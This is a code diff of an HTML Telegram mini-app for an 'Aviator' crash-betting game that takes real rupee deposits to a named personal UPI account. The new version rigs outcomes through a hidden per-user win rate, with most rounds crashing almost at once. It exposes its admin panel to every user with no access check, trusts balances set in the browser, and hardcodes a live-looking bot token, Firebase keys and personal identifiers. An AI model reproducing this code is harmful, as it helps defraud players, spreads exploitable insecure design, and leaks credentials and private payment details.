@@ -1,231 +1,345 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Game</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; margin: 0; padding: 10px; }
-        .card { background: #1e1e1e; padding: 12px; border-radius: 10px; margin-bottom: 12px; border: 1px solid #333; }
-        #gameCanvas { background: #000; border-radius: 6px; border: 2px solid #e50914; width: 100%; height: 160px; display: block; margin-bottom: 8px; }
-        .mult { font-size: 28px; font-weight: bold; color: #00ff66; margin: 4px 0; }
-        input { width: 90%; padding: 10px; margin: 5px 0; border-radius: 6px; border: 1px solid #444; background: #222; color: #fff; font-size: 14px; }
-        button { width: 95%; padding: 11px; font-weight: bold; font-size: 15px; border-radius: 6px; border: none; cursor: pointer; margin-top: 4px; }
-        .btn-red { background: #e50914; color: #fff; }
-        .btn-green { background: #00c853; color: #fff; }
-        .btn-support { background: #229ED9; color: #fff; display: block; text-decoration: none; font-weight: bold; padding: 11px; border-radius: 6px; margin-top: 10px; }
-        .ref { font-size: 12px; color: #00ff66; word-break: break-all; background: #222; padding: 6px; border-radius: 6px; margin-top: 4px; }
-        .admin-card { background: #2d1313; border: 1px solid #ff4444; display: none; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aviator Telegram App</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  
+  <!-- Firebase SDKs (Compat version for simple integration) -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <style>
+    body {
+      background-color: #0f1721;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 15px;
+      text-align: center;
+    }
+    .card {
+      background: #1a2634;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    .balance-box {
+      font-size: 22px;
+      font-weight: bold;
+      color: #38bdf8;
+    }
+    .btn-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    button {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .btn-deposit { background: #22c55e; color: white; }
+    .btn-withdraw { background: #f97316; color: white; }
+    .btn-action { background: #ef4444; color: white; width: 100%; padding: 12px; font-size: 18px; margin-top: 10px; }
+    .btn-admin { background: #a855f7; color: white; margin-top: 10px; }
+    
+    .tab-content { display: none; }
+    .active { display: block; }
+    
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #334155;
+      background: #0f1721;
+      color: white;
+      text-align: center;
+    }
+    .game-screen {
+      height: 180px;
+      background: #000;
+      border-radius: 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      font-weight: bold;
+      color: #22c55e;
+      position: relative;
+    }
+    .qr-img {
+      width: 180px;
+      height: 180px;
+      margin: 10px 0;
+      border-radius: 8px;
+      background: white;
+      padding: 5px;
+    }
+    .welcome-banner {
+      background: #2563eb;
+      color: white;
+      padding: 8px;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
 
-    <h2>🚀 Aviator Game</h2>
-
-    <!-- Game Card -->
-    <div class="card">
-        <canvas id="gameCanvas" width="300" height="160"></canvas>
-        <div class="mult" id="multText">1.00x</div>
-        <input type="number" id="betVal" placeholder="Bet Amount (₹)">
-        <button id="mainBtn" class="btn-red" onclick="action()">Place Bet</button>
+  <!-- Header & Balance -->
+  <div class="card">
+    <div id="welcome-msg" class="welcome-banner" style="display:none;">🎉 Welcome! ₹10 Bonus Added to your Wallet!</div>
+    <div>Wallet Balance</div>
+    <div class="balance-box">₹<span id="user-balance">0.00</span></div>
+    <div class="btn-group">
+      <button class="btn-deposit" onclick="showTab('deposit-tab')">➕ Deposit</button>
+      <button class="btn-withdraw" onclick="showTab('withdraw-tab')">➖ Withdraw</button>
     </div>
+  </div>
 
-    <!-- Wallet Balance -->
-    <div class="card">
-        <h3>Wallet Balance: ₹<span id="bal">0</span></h3>
-        <p style="font-size:11px; color:#aaa; margin:2px 0;">ID: <span id="uId">...</span></p>
+  <!-- Game Section -->
+  <div id="game-tab" class="tab-content active card">
+    <div class="game-screen" id="display">
+      <span id="multiplier">1.00x</span>
     </div>
+    <input type="number" id="bet-amount" value="5" placeholder="Bet Amount (₹)">
+    <button class="btn-action" id="game-btn" onclick="toggleGame()">BET (START)</button>
+    <button class="btn-admin" onclick="showTab('admin-tab')">⚙️ Admin Control Panel</button>
+  </div>
 
-    <!-- Deposit / Add Fund -->
-    <div class="card">
-        <h3>💳 Deposit / Add Fund</h3>
-        <input type="number" id="depAmt" placeholder="Enter Amount (₹)">
-        <input type="text" id="depUtr" placeholder="Enter 12-Digit UTR Number">
-        <button class="btn-green" onclick="submitDeposit()">Submit Deposit</button>
-    </div>
+  <!-- Deposit Section -->
+  <div id="deposit-tab" class="tab-content card">
+    <h3>Add Funds (UPI QR)</h3>
+    <p style="font-size: 13px; color: #94a3b8;">Scan & Pay via Google Pay, PhonePe, Paytm</p>
+    
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=ypuneet440@okaxis%26pn=Puneet%20Yadav" alt="UPI QR">
+    
+    <p>UPI ID: <b>ypuneet440@okaxis</b></p>
+    <input type="number" id="dep-amount" placeholder="Enter Paid Amount (₹)">
+    <input type="text" id="dep-utr" placeholder="Enter 12-Digit UTR/Ref No.">
+    <button class="btn-deposit" onclick="submitDeposit()">Submit Payment Proof</button>
+    <button style="background:#64748b; color:white; margin-top:8px;" onclick="showTab('game-tab')">Back to Game</button>
+  </div>
 
-    <!-- Refer & Earn -->
-    <div class="card">
-        <h3>🎁 Refer & Earn (₹100)</h3>
-        <div class="ref" id="refLink">Loading...</div>
-    </div>
+  <!-- Withdraw Section -->
+  <div id="withdraw-tab" class="tab-content card">
+    <h3>Withdraw Funds</h3>
+    <input type="number" id="wd-amount" placeholder="Enter Amount (Min ₹50)">
+    <input type="text" id="wd-upi" placeholder="Enter Your UPI ID">
+    <button class="btn-withdraw" onclick="submitWithdraw()">Submit Withdrawal Request</button>
+    <button style="background:#64748b; color:white; margin-top:8px;" onclick="showTab('game-tab')">Back to Game</button>
+  </div>
 
-    <!-- Withdrawal -->
-    <div class="card">
-        <h3>💸 Withdraw (Min ₹200)</h3>
-        <input type="number" id="wAmt" placeholder="Amount (Min ₹200)">
-        <input type="text" id="wUpi" placeholder="UPI ID">
-        <button class="btn-red" onclick="withdraw()">Submit Request</button>
-    </div>
+  <!-- Admin Control Panel -->
+  <div id="admin-tab" class="tab-content card">
+    <h3>⚙️ Admin Owner Panel</h3>
+    <p style="font-size: 12px; color: #94a3b8;">Enter Target User ID to change balance:</p>
+    <input type="text" id="admin-target-uid" placeholder="User Telegram ID">
+    <label>Set Wallet Balance (₹):</label>
+    <input type="number" id="admin-set-bal">
+    <button class="btn-deposit" style="margin-bottom: 12px;" onclick="updateBalance()">Update Balance</button>
+    
+    <label>User Win Probability (0.1 = 10%, 0.8 = 80%):</label>
+    <input type="number" step="0.1" id="admin-win-rate" value="0.3">
+    
+    <button class="btn-withdraw" onclick="saveAdminSettings()">Save Settings</button>
+    <button style="background:#64748b; color:white; margin-top:8px;" onclick="showTab('game-tab')">Back to Game</button>
+  </div>
 
-    <!-- Admin Panel -->
-    <div class="card admin-card" id="adminPanel">
-        <h3 style="color:#ff4444;">🛠️ Admin Panel</h3>
-        <input type="text" id="targetUser" placeholder="Target User ID">
-        <input type="number" id="addAmt" placeholder="Amount">
-        <div style="display:flex; gap:8px; justify-content:center;">
-            <button class="btn-green" style="width:46%;" onclick="adminBalance(true)">+ Add</button>
-            <button class="btn-red" style="width:46%;" onclick="adminBalance(false)">- Deduct</button>
-        </div>
-    </div>
+  <script>
+    // Firebase Config Integrated
+    const firebaseConfig = {
+      apiKey: "AIzaSyCreYezB7veF7EJ7GA9VMIAlsszD6FCMic",
+      authDomain: "aviator-3b6b1.firebaseapp.com",
+      projectId: "aviator-3b6b1",
+      storageBucket: "aviator-3b6b1.firebasestorage.app",
+      messagingSenderId: "963462673561",
+      appId: "1:963462673561:web:7c9cdc9a68d38c5ce53408",
+      databaseURL: "https://aviator-3b6b1-default-rtdb.firebaseio.com"
+    };
 
-    <!-- Support -->
-    <a href="https://t.me/Yadav63070" target="_blank" class="btn-support">🎧 Contact Support</a>
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    <script>
-        const ADMIN_ID = "6247495377";
+    const BOT_TOKEN = "7510349021:AAFEFZ1MuPY3Bh6mIlHto7UzVHITurxvcuc";
+    const ADMIN_CHAT_ID = "6247495377"; 
 
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        const user = tg.initDataUnsafe?.user || { id: "6247495377", first_name: "Puneet" };
-        document.getElementById('uId').innerText = user.id;
+    let tg = window.Telegram.WebApp;
+    if(tg) tg.expand();
 
-        if (user.id.toString() === ADMIN_ID) {
-            document.getElementById('adminPanel').style.display = "block";
-        }
+    // User Details
+    let tgUser = tg && tg.initDataUnsafe ? tg.initDataUnsafe.user : null;
+    let userName = tgUser ? (tgUser.first_name + " " + (tgUser.last_name || "")) : "Guest User";
+    let userId = tgUser ? tgUser.id.toString() : "guest_12345";
+    let userHandle = tgUser && tgUser.username ? ("@" + tgUser.username) : "No Username";
 
-        const firebaseConfig = { databaseURL: "https://aviator-app-default-rtdb.firebaseio.com" };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+    document.getElementById('admin-target-uid').value = userId;
 
-        document.getElementById('refLink').innerText = `https://t.me/puneetrashibot?start=${user.id}`;
+    let balance = 0.00;
+    let winProbability = 0.3;
+    let isPlaying = false;
+    let timer = null;
+    let currentMultiplier = 1.00;
 
-        let balance = 0;
-        const uRef = db.ref('users/' + user.id);
-        uRef.on('value', (s) => {
-            const data = s.val();
-            if (data) {
-                balance = data.balance || 0;
-                document.getElementById('bal').innerText = balance;
-            } else {
-                let refBy = tg.initDataUnsafe?.start_param;
-                if (refBy && refBy !== user.id.toString()) {
-                    db.ref('users/' + refBy + '/balance').transaction(c => (c || 0) + 100);
-                }
-                uRef.set({ name: user.first_name, balance: 0, referredBy: refBy || null });
-            }
+    // Firebase Realtime Listener for Current User
+    const userRef = db.ref('users/' + userId);
+    userRef.on('value', (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        balance = parseFloat(data.balance) || 0.00;
+        winProbability = parseFloat(data.winRate) || 0.3;
+        document.getElementById('user-balance').innerText = balance.toFixed(2);
+        document.getElementById('admin-set-bal').value = balance;
+        document.getElementById('admin-win-rate').value = winProbability;
+      } else {
+        // New User Initialization with ₹10 Welcome Bonus
+        balance = 10.00;
+        userRef.set({
+          name: userName,
+          username: userHandle,
+          balance: balance,
+          winRate: 0.3
         });
+        document.getElementById('welcome-msg').style.display = 'block';
+        document.getElementById('user-balance').innerText = balance.toFixed(2);
+        
+        sendTelegramNotification(`🎉 NEW USER JOINED\n\nName: ${userName}\nID: ${userId}\nUsername: ${userHandle}\nBonus Given: ₹10`);
+      }
+    });
 
-        const cvs = document.getElementById('gameCanvas');
-        const ctx = cvs.getContext('2d');
-        let running = false, mult = 1.00, timer, crash = 0, bet = 0;
-        let points = [];
+    function sendTelegramNotification(textMessage) {
+      let encodedMsg = encodeURIComponent(textMessage);
+      let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodedMsg}`;
+      let img = new Image();
+      img.src = url;
+    }
 
-        function drawGraph() {
-            ctx.clearRect(0, 0, cvs.width, cvs.height);
-            if (points.length < 2) return;
+    function saveBalanceToDB(newBal) {
+      balance = newBal;
+      userRef.update({ balance: balance });
+    }
 
-            ctx.beginPath();
-            ctx.strokeStyle = '#e50914';
-            ctx.lineWidth = 3;
-            ctx.moveTo(points[0].x, points[0].y);
-            for (let i = 1; i < points.length; i++) {
-                ctx.lineTo(points[i].x, points[i].y);
-            }
-            ctx.stroke();
+    function showTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
+    }
 
-            const last = points[points.length - 1];
-            ctx.fillStyle = '#ffcc00';
-            ctx.beginPath();
-            ctx.arc(last.x, last.y, 6, 0, Math.PI * 2);
-            ctx.fill();
+    function toggleGame() {
+      let btn = document.getElementById('game-btn');
+      let multText = document.getElementById('multiplier');
+      let bet = parseFloat(document.getElementById('bet-amount').value);
+
+      if (!isPlaying) {
+        if (bet > balance || isNaN(bet) || bet <= 0) {
+          alert("Insufficient or Invalid Balance!");
+          return;
         }
 
-        function action() {
-            const btn = document.getElementById('mainBtn');
-            if (!running) {
-                const input = parseFloat(document.getElementById('betVal').value);
-                if (!input || input <= 0) return alert("Valid amount daalein!");
-                if (input > balance) return alert("Low balance!");
-                
-                bet = input;
-                balance -= bet;
-                uRef.update({ balance: balance });
+        saveBalanceToDB(balance - bet);
 
-                running = true;
-                btn.innerText = "Cashout";
-                btn.className = "btn-green";
-                
-                mult = 1.00;
-                crash = (Math.random() * 3 + 1.1).toFixed(2);
-                points = [{ x: 10, y: cvs.height - 10 }];
+        isPlaying = true;
+        btn.innerText = "CASH OUT";
+        btn.style.background = "#22c55e";
 
-                timer = setInterval(() => {
-                    mult += 0.03;
-                    document.getElementById('multText').innerText = mult.toFixed(2) + 'x';
-                    document.getElementById('multText').style.color = '#00ff66';
+        currentMultiplier = 1.00;
+        let isWinRound = Math.random() < winProbability;
+        let crashPoint = isWinRound ? (Math.random() * 3 + 1.5).toFixed(2) : (Math.random() * 0.3 + 1.02).toFixed(2);
 
-                    let last = points[points.length - 1];
-                    let nextX = last.x + 3;
-                    let nextY = cvs.height - 10 - Math.pow(nextX / 14, 1.5);
-                    if (nextY < 15) nextY = 15;
-                    points.push({ x: nextX, y: nextY });
+        timer = setInterval(() => {
+          currentMultiplier += 0.05;
+          multText.innerText = currentMultiplier.toFixed(2) + 'x';
 
-                    drawGraph();
+          if (currentMultiplier >= crashPoint) {
+            clearInterval(timer);
+            multText.innerText = "CRASHED @ " + crashPoint + "x";
+            multText.style.color = "#ef4444";
+            btn.innerText = "BET (START)";
+            btn.style.background = "#ef4444";
+            isPlaying = false;
+            
+            setTimeout(() => { multText.style.color = "#22c55e"; }, 1500);
+          }
+        }, 80);
 
-                    if (mult >= crash) {
-                        clearInterval(timer);
-                        document.getElementById('multText').innerText = 'CRASHED! (' + crash + 'x)';
-                        document.getElementById('multText').style.color = '#e50914';
-                        alert("Crash ho gaya!");
-                        reset();
-                    }
-                }, 100);
-            } else {
-                clearInterval(timer);
-                const win = Math.floor(bet * mult);
-                balance += win;
-                uRef.update({ balance: balance });
-                alert(`Jeet gaye! ₹${win} add ho gaye.`);
-                reset();
-            }
-        }
+      } else {
+        clearInterval(timer);
+        let winAmt = bet * currentMultiplier;
+        saveBalanceToDB(balance + winAmt);
 
-        function reset() {
-            running = false;
-            const btn = document.getElementById('mainBtn');
-            btn.innerText = "Place Bet";
-            btn.className = "btn-red";
-        }
+        alert("Cashed Out! Won: ₹" + winAmt.toFixed(2));
+        btn.innerText = "BET (START)";
+        btn.style.background = "#ef4444";
+        isPlaying = false;
+      }
+    }
 
-        function submitDeposit() {
-            const amt = parseFloat(document.getElementById('depAmt').value);
-            const utr = document.getElementById('depUtr').value.trim();
-            if (!amt || amt <= 0 || !utr) return alert("Sahi details bharein!");
+    function submitDeposit() {
+      let amt = document.getElementById('dep-amount').value;
+      let utr = document.getElementById('dep-utr').value;
+      if (!amt || !utr) {
+        alert("Enter Amount and UTR Number!");
+        return;
+      }
+      
+      let msg = `📥 NEW DEPOSIT REQUEST\n\nUser: ${userName}\nID: ${userId}\nUsername: ${userHandle}\nAmount: ₹${amt}\nUTR/Ref: ${utr}\nCurrent Balance: ₹${balance}`;
+      
+      sendTelegramNotification(msg);
+      alert("Deposit Request Submitted!");
+      showTab('game-tab');
+    }
 
-            db.ref('deposits').push({ userId: user.id, amount: amt, utr: utr, status: 'pending', time: Date.now() });
-            alert("Deposit request bhej di gayi hai!");
-            document.getElementById('depAmt').value = '';
-            document.getElementById('depUtr').value = '';
-        }
+    function submitWithdraw() {
+      let amt = parseFloat(document.getElementById('wd-amount').value);
+      let upi = document.getElementById('wd-upi').value;
+      if (amt > balance) {
+        alert("Insufficient Balance!");
+        return;
+      }
+      if (!amt || !upi) {
+        alert("Enter valid Amount & UPI ID!");
+        return;
+      }
 
-        function withdraw() {
-            const amt = parseFloat(document.getElementById('wAmt').value);
-            const upi = document.getElementById('wUpi').value.trim();
-            if (!amt || amt < 200 || !upi) return alert("Min withdraw ₹200 aur UPI ID zaroori hai!");
-            if (amt > balance) return alert("Low balance!");
+      saveBalanceToDB(balance - amt);
 
-            db.ref('withdrawals').push({ userId: user.id, amount: amt, upi: upi, status: 'pending', time: Date.now() });
-            uRef.update({ balance: balance - amt });
-            alert("Withdraw request submit ho gayi!");
-            document.getElementById('wAmt').value = '';
-            document.getElementById('wUpi').value = '';
-        }
+      let msg = `📤 NEW WITHDRAWAL REQUEST\n\nUser: ${userName}\nID: ${userId}\nUsername: ${userHandle}\nAmount: ₹${amt}\nUPI ID: ${upi}\nRemaining Balance: ₹${balance}`;
+      
+      sendTelegramNotification(msg);
+      alert("Withdrawal Request Submitted!");
+      showTab('game-tab');
+    }
 
-        function adminBalance(isAdd) {
-            const target = document.getElementById('targetUser').value.trim();
-            const amt = parseFloat(document.getElementById('addAmt').value);
-            if (!target || !amt) return alert("ID aur Amount bharein!");
+    // Admin Function to Update Any User's Balance
+    function updateBalance() {
+      let targetUid = document.getElementById('admin-target-uid').value.trim();
+      let newBal = parseFloat(document.getElementById('admin-set-bal').value);
+      if (targetUid && !isNaN(newBal)) {
+        db.ref('users/' + targetUid).update({ balance: newBal });
+        alert("Balance Updated for User ID: " + targetUid);
+      } else {
+        alert("Enter Valid User ID & Amount!");
+      }
+    }
 
-            db.ref('users/' + target + '/balance').transaction((curr) => {
-                return isAdd ? ((curr || 0) + amt) : Math.max(0, (curr || 0) - amt);
-            }, (err, committed) => {
-                if (committed) alert("Success!");
-            });
-        }
-    </script>
+    // Admin Function to Save Win Rate Settings
+    function saveAdminSettings() {
+      let targetUid = document.getElementById('admin-target-uid').value.trim();
+      let rate = parseFloat(document.getElementById('admin-win-rate').value);
+      if (targetUid && !isNaN(rate) && rate >= 0 && rate <= 1) {
+        db.ref('users/' + targetUid).update({ winRate: rate });
+        alert("Win Rate Saved for User ID: " + targetUid);
+        showTab('game-tab');
+      }
+    }
+  </script>
 </body>
 </html>
